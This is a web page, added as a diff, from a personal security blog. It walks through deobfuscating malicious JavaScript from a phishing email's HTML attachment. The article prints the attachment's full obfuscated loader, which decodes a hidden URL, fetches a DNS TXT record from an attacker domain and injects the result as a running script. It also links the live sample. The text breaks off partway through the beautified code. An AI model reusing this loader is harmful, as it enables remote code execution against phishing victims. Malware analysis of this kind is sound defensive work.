@@ -1,0 +1,1009 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="It's the weekend and you ran out of things to do?  Why don't you try deobfuscating this malicious Javascript!">
+      
+      
+      
+      
+      <link rel="shortcut icon" href="../../../../images/terminal-24.svg">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.3">
+    
+    
+      
+        <title>How to Deobfuscate JavaScript (JS) - Mo Sharif</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.3b61ea93.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.39b8e14a.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#e92063">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="pink" data-md-color-accent="">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#introduction" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../../../.." title="Mo Sharif" class="md-header-nav__button md-logo" aria-label="Mo Sharif">
+      
+  <img src="../../../../images/terminal-24.svg" alt="logo">
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            Mo Sharif
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              How to Deobfuscate JavaScript (JS)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Mo Sharif" class="md-nav__button md-logo" aria-label="Mo Sharif">
+      
+  <img src="../../../../images/terminal-24.svg" alt="logo">
+
+    </a>
+    Mo Sharif
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../.." class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Posts
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Posts" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        Posts
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" >
+    
+    <label class="md-nav__link" for="nav-2-1">
+      2020
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="2020" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        <span class="md-nav__icon md-icon"></span>
+        2020
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../2020/kringlecon3/" class="md-nav__link">
+      KringleCon 3
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2" checked>
+    
+    <label class="md-nav__link" for="nav-2-2">
+      2019
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="2019" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        <span class="md-nav__icon md-icon"></span>
+        2019
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../kringlecon2/2020-01-13-KringleCon2/" class="md-nav__link">
+      KringleCon 2
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        How to Deobfuscate JavaScript
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      How to Deobfuscate JavaScript
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    Introduction
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#instructions" class="md-nav__link">
+    Instructions
+  </a>
+  
+    <nav class="md-nav" aria-label="Instructions">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#required-tools" class="md-nav__link">
+    Required Tools
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lets-get-started" class="md-nav__link">
+    Lets Get Started
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-deobfuscation" class="md-nav__link">
+    JavaScript Deobfuscation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blocking-the-script" class="md-nav__link">
+    Blocking the Script
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    Conclusion
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../post2/2019-04-22-HowToSignUpForHackTheBox/" class="md-nav__link">
+      How to Sign Up for Hack The Box
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../post1/2019-04-06-HowToCreateAVM/" class="md-nav__link">
+      How to Create a Win10 VM for Malware Analysis, Forensic or Offensive Tasks
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3" >
+    
+    <label class="md-nav__link" for="nav-2-3">
+      2018
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="2018" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-3">
+        <span class="md-nav__icon md-icon"></span>
+        2018
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../2018/post3/2018-12-16-HowToCreateAnAWSLambdaLayer/" class="md-nav__link">
+      How to Create an AWS Lambda Layer
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/" class="md-nav__link">
+      How to Create an AWS Lambda Function
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../2018/post1/2018-11-03-HowToCreateATwitterApp/" class="md-nav__link">
+      How to Create a Twitter App
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../books/" class="md-nav__link">
+      Books
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../resources/" class="md-nav__link">
+      Resources
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="https://www.patreon.com/mo4n6" class="md-nav__link">
+      Donate
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../about/" class="md-nav__link">
+      About
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    Introduction
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#instructions" class="md-nav__link">
+    Instructions
+  </a>
+  
+    <nav class="md-nav" aria-label="Instructions">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#required-tools" class="md-nav__link">
+    Required Tools
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lets-get-started" class="md-nav__link">
+    Lets Get Started
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-deobfuscation" class="md-nav__link">
+    JavaScript Deobfuscation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blocking-the-script" class="md-nav__link">
+    Blocking the Script
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    Conclusion
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>How to Deobfuscate JavaScript</h1>
+                
+                <p><a href="../../../../assets/images/2019-06-16-HowToDeobfuscateJS/Image1.png"><img alt="post 2" src="../../../../assets/images/2019-06-16-HowToDeobfuscateJS/Image1.png" /></a></p>
+<p><em>Figure 1 - Obfuscated/Deobfucated JavaScript from a Phishing email</em></p>
+<hr />
+<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
+<p>Recently I came across an interesting phishing email.  The email contained a XML HTML attachment.  The HTML attachment contained a XML header with HTML markup and obfuscated JavaScript(JS) code.  </p>
+<p>Figure 2 shows the phishing email <a href="../../../../assets/images/2019-06-16-HowToDeobfuscateJS/Image2.png">2</a>.</p>
+<hr />
+<p><a href="../../../../assets/images/2019-06-16-HowToDeobfuscateJS/Image2.png"><img alt="post 2" src="../../../../assets/images/2019-06-16-HowToDeobfuscateJS/Image2.png" /></a></p>
+<p><em>Figure 2 - A Phishing Email with HTML Attachment</em></p>
+<hr />
+<p>Figure 3 shows the code contained in the attachment.</p>
+<hr />
+<p><a href="../../../../assets/images/2019-06-16-HowToDeobfuscateJS/Image3.png"><img alt="post 2" src="../../../../assets/images/2019-06-16-HowToDeobfuscateJS/Image3.png" /></a></p>
+<p><em>Figure 3 - XML HTML File with Malicious JavaScript</em></p>
+<hr />
+<p>In this article we're going to analysis the HTML attachment.</p>
+<h2 id="instructions">Instructions<a class="headerlink" href="#instructions" title="Permanent link">&para;</a></h2>
+<p>Lets get started.  We're going to take a part the HTML attachment to see what each part does.  We'll need some tools to do this.</p>
+<h3 id="required-tools">Required Tools<a class="headerlink" href="#required-tools" title="Permanent link">&para;</a></h3>
+<p>Here are the tools you need:</p>
+<ul>
+<li>A Sandbox Lab (if you don't have one, then build <a href="https://www.sharif.org/2019/04/HowToCreateAVM/">one</a>)</li>
+<li>Didier Stevens's SpiderMonkey (<a href="https://blog.didierstevens.com/programs/spidermonkey/">Link</a>)</li>
+</ul>
+<p>Upload the HTML attachment to your sandbox (Be Very Careful!).  You can get a copy <a href="https://myonlinesecurity.co.uk/wp-content/uploads/2019/06/delivery-328.zip">here</a> (Usual Password)</p>
+<p>To reduce the risk of accidental double clicking on the malicious attachments you can do the following:</p>
+<blockquote>
+<p>Re-associate .html extensions to open in notepad or your favorite hex editor.  This will reduce the chance of accidentally double clicking a malicious file while trying to transfer it to your sandbox. Why stop there?  Re-associate other high risk extensions (ex. .doc, .xls, .pdf, .vbs, .js) to open in Notepad too.  I may revisit this idea in another article.</p>
+</blockquote>
+<h3 id="lets-get-started">Lets Get Started<a class="headerlink" href="#lets-get-started" title="Permanent link">&para;</a></h3>
+<p>Here is the code contained in the malicious HTML attachment:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/1999/xhtml&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">content=</span><span class="s">&quot;&quot;</span> <span class="nt">/&gt;&lt;script</span> <span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">xml:space=</span><span class="s">&quot;preserve&quot;</span><span class="nt">&gt;</span>//<span class="cp">&lt;![CDATA[</span>
+<span class="cp">    var v = window.atob(&quot;aHR0cHM6Ly9kbnMuZ29vZ2xlLmNvbS9yZXNvbHZlP25hbWU9ZmV0Y2guc2x6eGtjZWUuZ2xhbWlzYm91bmQuY29tJnR5cGU9VFhU&quot;);</span>
+<span class="cp">    var _0x2b42=[&#39;0xc&#39;,&#39;open&#39;,&#39;GET&#39;,&#39;onreadystatechange&#39;,&#39;status&#39;,&#39;readyState&#39;,&#39;parse&#39;,&#39;responseText&#39;,&#39;createElement&#39;,&#39;script&#39;,&#39;innerHTML&#39;,&#39;substring&#39;,&#39;send&#39;,&#39;push&#39;,&#39;shift&#39;,&#39;0x0&#39;,&#39;0x1&#39;,&#39;0x2&#39;,&#39;0x3&#39;,&#39;0x4&#39;,&#39;0x5&#39;,&#39;0x6&#39;,&#39;0x7&#39;,&#39;data&#39;,&#39;0x8&#39;,&#39;0x9&#39;,&#39;0xa&#39;,&#39;0xb&#39;,&#39;length&#39;,&#39;body&#39;];(function(_0x26248d,_0x33adc9){var _0x47fb3a=function(_0xb8f9b1){while(--_0xb8f9b1){_0x26248d[&#39;push&#39;](_0x26248d[&#39;shift&#39;]());}};_0x47fb3a(++_0x33adc9);}(_0x2b42,0x97));var _0x58f7=function(_0x3aa2b9,_0x591490){_0x3aa2b9=_0x3aa2b9-0x0;var _0x2886d9=_0x2b42[_0x3aa2b9];return _0x2886d9;};function ccc(){var _0x3bf9f2=[_0x58f7(&#39;0x0&#39;),_0x58f7(&#39;0x1&#39;),_0x58f7(&#39;0x2&#39;),_0x58f7(&#39;0x3&#39;),_0x58f7(&#39;0x4&#39;),_0x58f7(&#39;0x5&#39;),_0x58f7(&#39;0x6&#39;),&#39;Answer&#39;,_0x58f7(&#39;0x7&#39;),_0x58f7(&#39;0x8&#39;),_0x58f7(&#39;0x9&#39;),_0x58f7(&#39;0xa&#39;),&#39;appendChild&#39;,_0x58f7(&#39;0xb&#39;)];(function(_0x532510,_0x26a9cf){var _0x47b474=function(_0x5c32a3){while(--_0x5c32a3){_0x532510[_0x58f7(&#39;0xc&#39;)](_0x532510[_0x58f7(&#39;0xd&#39;)]());}};_0x47b474(++_0x26a9cf);}(_0x3bf9f2,0x1b2));var _0x58060d=function(_0x13b5d5,_0x174409){_0x13b5d5=_0x13b5d5-0x0;var _0x1aae1c=_0x3bf9f2[_0x13b5d5];return _0x1aae1c;};var _0x48f014=new XMLHttpRequest();_0x48f014[_0x58060d(_0x58f7(&#39;0xe&#39;))](_0x58060d(_0x58f7(&#39;0xf&#39;)),v);_0x48f014[_0x58060d(_0x58f7(&#39;0x10&#39;))]=function(){if(_0x48f014[_0x58060d(_0x58f7(&#39;0x11&#39;))]==0xc8&amp;&amp;_0x48f014[_0x58060d(_0x58f7(&#39;0x12&#39;))]==0x4){var _0x45edda=JSON[_0x58060d(_0x58f7(&#39;0x13&#39;))](_0x48f014[_0x58060d(_0x58f7(&#39;0x14&#39;))]);var _0x2e08f9=_0x45edda[_0x58060d(_0x58f7(&#39;0x15&#39;))][0x0][_0x58f7(&#39;0x16&#39;)];var _0x599d3c=document[_0x58060d(_0x58f7(&#39;0x17&#39;))](_0x58060d(_0x58f7(&#39;0x18&#39;)));_0x599d3c[_0x58060d(_0x58f7(&#39;0x19&#39;))]=_0x2e08f9[_0x58060d(_0x58f7(&#39;0x1a&#39;))](0x1,_0x2e08f9[_0x58f7(&#39;0x1b&#39;)]-0x1);document[_0x58f7(&#39;0x1c&#39;)][_0x58060d(_0x58f7(&#39;0x1d&#39;))](_0x599d3c);}};_0x48f014[_0x58060d(&#39;0xd&#39;)]();}</span>
+<span class="cp">    //]]&gt;</span>
+    <span class="nt">&lt;/script&gt;&lt;script</span> <span class="na">src=</span><span class="s">&quot;https://accounts.google.com/o/oauth2/revoke?callback=ccc()&quot;</span> <span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">xml:space=</span><span class="s">&quot;preserve&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
+    <span class="nt">&lt;title&gt;&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    Loading...
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div>
+<p>Here are some of the things that stand out :</p>
+<ul>
+<li>Line 1 is the XML header</li>
+<li>Line 2 is defining an HTML XML Document</li>
+<li>Line 3 start of the HTML document</li>
+<li>Line 5 script tag containing JavaScript</li>
+<li>Line 5 also contains interesting code - xml:space="preserve"&gt;//&lt;![CDATA[</li>
+<li>Line 6-7 JS code</li>
+<li>Line 8 interesting end for a JavaScript - //]]&gt;</li>
+<li>Line 9 end of first script and started of second script</li>
+<li>Line 12-14 the HTML body that shows the message "Loading..."</li>
+<li>Line 15 end of the html - </html></li>
+</ul>
+<p>There are two script blocks in the attachment.  The first script block starts on Line 5 and it contains JavaScript code.  Line 5 contains some interesting code:</p>
+<p><code>xml:space="preserve"&gt;//&lt;![CDATA[</code></p>
+<p>The first part <code>xml:space="preserve"&gt;</code> is at the end of the HTML script tag.  </p>
+<p>Here is what it means <a href="../../../../assets/images/2019-06-16-HowToDeobfuscateJS/Image3.png">3</a>:</p>
+<blockquote>
+<p>The xml:space="preserve" directive says that space within element content is significant.</p>
+</blockquote>
+<p>It's basically a XML parser instruction that specifies space is important.</p>
+<p>The second part <code>//&lt;![CDATA[</code> is the start of the JavaScript code. In JavaScript <code>//</code> denotes a comment.  </p>
+<p>Here is what <code>&lt;![CDATA[</code> means in XML [4]:</p>
+<blockquote>
+<p>The term CDATA means, Character Data. CDATA is defined as blocks of text that are not parsed by the parser, but are otherwise recognized as markup.
+...</p>
+<p>Following is the syntax for CDATA section −</p>
+<div class="highlight"><pre><span></span><code>&lt;![CDATA[
+   characters with markup
+]]&gt;
+</code></pre></div>
+</blockquote>
+<p>The above also explains Line 8 of the attachment file.  <code>]]&gt;</code> means it's the end of the CDATA section.  </p>
+<p>This leaves line 6 and 7 that is the actual obfuscated JS code.  Lets take a closer look.</p>
+<p>First, lets see if we can make the code more readable using a JS  beautifier.  There are many different websites online that provide this service.  On our sandbox, using the one <a href="https://beautifier.io/">here</a> we beautify line 6 and 7.  Here is resulting code:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">v</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">atob</span><span class="p">(</span><span class="s2">&quot;aHR0cHM6Ly9kbnMuZ29vZ2xlLmNvbS9yZXNvbHZlP25hbWU9ZmV0Y2guc2x6eGtjZWUuZ2xhbWlzYm91bmQuY29tJnR5cGU9VFhU&quot;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">_0x2b42</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;0xc&#39;</span><span class="p">,</span> <span class="s1">&#39;open&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;onreadystatechange&#39;</span><span class="p">,</span> <span class="s1">&#39;status&#39;</span><span class="p">,</span> <span class="s1">&#39;readyState&#39;</span><span class="p">,</span> <span class="s1">&#39;parse&#39;</span><span class="p">,</span> <span class="s1">&#39;responseText&#39;</span><span class="p">,</span> <span class="s1">&#39;createElement&#39;</span><span class="p">,</span> <span class="s1">&#39;script&#39;</span><span class="p">,</span> <span class="s1">&#39;innerHTML&#39;</span><span class="p">,</span> <span class="s1">&#39;substring&#39;</span><span class="p">,</span> <span class="s1">&#39;send&#39;</span><span class="p">,</span> <span class="s1">&#39;push&#39;</span><span class="p">,</span> <span class="s1">&#39;shift&#39;</span><span class="p">,</span> <span class="s1">&#39;0x0&#39;</span><span class="p">,</span> <span class="s1">&#39;0x1&#39;</span><span class="p">,</span> <span class="s1">&#39;0x2&#39;</span><span class="p">,</span> <span class="s1">&#39;0x3&#39;</span><span class="p">,</span> <span class="s1">&#39;0x4&#39;</span><span class="p">,</span> <span class="s1">&#39;0x5&#39;</span><span class="p">,</span> <span class="s1">&#39;0x6&#39;</span><span class="p">,</span> <span class="s1">&#39;0x7&#39;</span><span class="p">,</span> <span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="s1">&#39;0x8&#39;</span><span class="p">,</span> <span class="s1">&#39;0x9&#39;</span><span class="p">,</span> <span class="s1">&#39;0xa&#39;</span><span class="p">,</span> <span class="s1">&#39;0xb&#39;</span><span class="p">,</span> <span class="s1">&#39;length&#39;</span><span class="p">,</span> <span class="s1">&#39;body&#39;</span><span class="p">];</span>
+<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x26248d</span><span class="p">,</span> <span class="nx">_0x33adc9</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">_0x47fb3a</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">_0xb8f9b1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="nx">_0xb8f9b1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">_0x26248d</span><span class="p">[</span><span class="s1">&#39;push&#39;</span><span class="p">](</span><span class="nx">_0x26248d</span><span class="p">[</span><span class="s1">&#39;shift&#39;</span><span class="p">]());</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="nx">_0x47fb3a</span><span class="p">(</span><span class="o">++</span><span class="nx">_0x33adc9</span><span class="p">);</span>
+<span class="p">}(</span><span class="nx">_0x2b42</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">));</span>
+<span class="kd">var</span> <span class="nx">_0x58f7</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">_0x3aa2b9</span><span class="p">,</span> <span class="nx">_0x591490</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">_0x3aa2b9</span> <span class="o">=</span> <span class="nx">_0x3aa2b9</span> <span class="o">-</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">_0x2886d9</span> <span class="o">=</span> <span class="nx">_0x2b42</span><span class="p">[</span><span class="nx">_0x3aa2b9</span><span class="p">];</span>
+    <span class="k">return</span> <span class="nx">_0x2886d9</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kd">function</span> <span class="nx">ccc</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">_0x3bf9f2</span> <span class="o">=</span> <span class="p">[</span><span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x0&#39;</span><span class="p">),</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x1&#39;</span><span class="p">),</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x2&#39;</span><span class="p">),</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x3&#39;</span><span class="p">),</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x4&#39;</span><span class="p">),</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x5&#39;</span><span class="p">),</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x6&#39;</span><span class="p">),</span> <span class="s1">&#39;Answer&#39;</span><span class="p">,</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x7&#39;</span><span class="p">),</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x8&#39;</span><span class="p">),</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0x9&#39;</span><span class="p">),</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0xa&#39;</span><span class="p">),</span> <span class="s1">&#39;appendChild&#39;</span><span class="p">,</span> <span class="nx">_0x58f7</span><span class="p">(</span><span class="s1">&#39;0xb&#39;</span><span class="p">)];</span>
+    <span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x532510</span><span class="p">,</span> <span class="nx">_0x26a9cf</span><span class="p">)</span> <span class="p">{</span>
